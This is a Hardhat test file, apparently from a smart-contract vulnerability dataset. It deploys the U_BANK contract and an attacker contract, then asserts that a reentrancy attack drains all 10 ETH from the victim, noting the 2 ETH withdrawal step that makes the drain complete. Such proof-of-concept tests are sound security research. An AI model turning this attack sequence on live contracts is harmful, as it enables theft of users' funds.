const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol", function () {
  let U_BANK;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol:Log");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy U_BANK contract with Log address
    U_BANK = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol:U_BANK");
    victim = await U_BANK.deploy(log.target);
    await victim.waitForDeployment();
 
    // Deploy MaliciousContract with U_BANK address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
    
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Put( 1, {value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(victim.target);
    expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({value:  ethers.parseEther("5")});

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10")); 

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [
        hacker.target,
        "0x0",
      ]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    // for this particular contract the MinSum is 2. 
    // If hacker uses an odd number will miss 1 eth
    await hacker.attack( ethers.parseEther("2")); 

    
    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful
    
    // victim has a drained account
    expect(victimBalance).to.equal(ethers.parseEther("0")); 

    // 5 original balance + 5 from  initial deposit 
    expect(maliciousContractBalance).to.equal(ethers.parseEther("10"));
    
  });
});
